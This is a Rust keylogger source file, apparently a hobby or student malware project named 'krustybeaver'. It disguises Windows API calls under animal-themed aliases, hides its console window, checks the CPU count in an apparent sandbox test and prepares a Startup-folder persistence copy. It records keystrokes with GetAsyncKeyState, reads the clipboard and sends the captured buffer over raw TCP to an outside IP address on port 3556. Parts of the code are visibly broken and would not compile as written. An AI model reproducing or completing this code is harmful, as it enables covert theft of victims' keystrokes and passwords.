extern crate winapi;
extern crate clokwerk;

use std::net::TcpStream as PStream;
use std::thread;
use std::thread::ThreadId;


use std::time;
use std::io::Write;
use std::process::Command;

use clokwerk::Scheduler;
use winapi::um::winuser::GetAsyncKeyState as mongoose;
use winapi::um::winuser::GetClipboardData as goose;
use winapi::um::winuser::ShowWindow as duck;
use winapi::um::wincon::GetConsoleWindow as turtle;
use num_cpus::get as flipflop;



const MAX_CPUS: usize = 4;
const THREADS: usize = 4;



fn is_gucchi() -> bool{
    let money = flipflop();

    println!("{}", money);

    if money > MAX_CPUS {
        thread::current().unpark();
        return true;
    }
    else {
        thread::park();
        return false;
    }       

}

fn manatee(manatee: &str, seconds: u64) {
    let schleep = time::Duration::from_secs(seconds);

    thread::sleep(schleep);
    println!("Hello I am {} {:?}", manatee, the_read_eye_d());
}

fn i_hate_microsoft() {
    unsafe {
        let handle = turtle();
        duck(handle, 0);
    }
    
}

fn lipbored(){
    let schleep = time::Duration::from_secs(600);

    thread::sleep(schleep);
    unsafe {
        let duckduck = goose(1);
    }
}

fn parse(num: u8, is_cap: bool, shift_state: bool) -> char {
    let mut character: char = '\0';
    
    let character = match num {
        32 => ' ',
        96..=105 => num as char,
        65..=90 if is_cap => num as char,
        65..=90 => (num + 32) as char,
        48..=64 if !shift_state => num as char,
        48..=57 if shift_state => match num - 48 {
            0..=9 => (num + 41) as char,
            _ => unreachable!(),
        },
        186 => if shift_state { ':' } else { ';' },
        187 => if shift_state { '+' } else { '=' },
        188 => if shift_state { '<' } else { ',' },
        189 => if shift_state { '_' } else { '-' },
        190 => if shift_state { '>' } else { '.' },
        191 => if shift_state { '?' } else { '/' },
        192 => if shift_state { '~' } else { '`' },
        219 => if shift_state { '{' } else { '[' },
        220 => if shift_state { '|' } else { '\\' },
        221 => if shift_state { '}' } else { ']' },
        222 => if shift_state { '\"' } else { '\'' },
        0..=255 => {
            println!("I am a Beaver");
            return;
        }
        255..=u8::MAX => unreachable!(),
        _ => unreachable!(),
    };
   
    return character;
}

fn snailmail(ip: &str, port: &str, mut buffer: String){
    match PStream::connect(format!("{}:{}", ip,port)) {
        Ok(mut stream) => {
            
            let buffer_mut_str = buffer.as_mut_str();
            let msg = buffer_mut_str.as_bytes();

            stream.write(msg).unwrap();
        }
        Err(e) => {
            println!("Beaver is now sad");
        }
    }
}

fn the_read_eye_d() -> i32{

    let thread_id = thread::current().id();
    let mut id_string: String = format!("{:?}", thread_id);
    id_string = id_string.split_off(9);
    id_string = id_string.replace(")", "");
    let id = id_string.parse::<i32>().unwrap();

    return id;
}

fn beaver(){
    let schleep = time::Duration::from_millis(100);

    println!("Hello I am a Beaver {:?}", the_read_eye_d());
    
    is_gucchi();

    let mut buffer = String::new();

    Command::new("cp").arg(".\\krustybeaver.exe").arg("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");

    //Run for 30 min : 20000

    for _i in 1..2000 {
        thread::sleep(schleep);
        //println!("Hello I am a Beaver\n");
        let mut cap = false;

        for i in 0..255 {
            unsafe {
                let state = mongoose(i);
                let shift_state = mongoose(16) != 0;
                let cap_state = mongoose(20) != 0;

                if cap_state {
                    if !cap {
                        cap = true;
                    }
                    else {
                        cap = false;
                    }
                }

                let is_cap = shift_state && !cap || !shift_state && cap;

                let num = i as u8;
                if state != 0 {
                    let character:char = parse(num, is_cap, shift_state);
                    buffer.push(character);
                }
            }
        }
    }
    snailmail("163.118.", "3556", buffer);
}


fn main() {
    
    //spawn this many threads

    let animals: [&str; 24] = ["Manatee", "Badger", "Banana", "Analope", "Mongoose", "Moose", "Aardvark", "Unicorn", "Turtle", "Platypus", "Kangaroo", "Dolphin", "Crab", "CLion", "Panther", "The Pope", "Shark", "Bunny", "Ferret", "Elk", "Moose again", "Spongebob Me Boy", "No this is Patrick", "Clownfish named after nemo's dead mom"];
    
    //i_hate_microsoft();

    let mut scheduler = Scheduler::new();

    for i in 0..THREADS {
        thread::spawn(move ||{
            loop{
                manatee(animals[i],5 as u64);
            }
        });
    }
    
    thread::spawn(move || {
        loop {
            beaver();
        }
    });

    thread::spawn(move || {
        loop {
            lipbored();
        }
    });

    loop {
        manatee("Capybara", 3);
    }
}
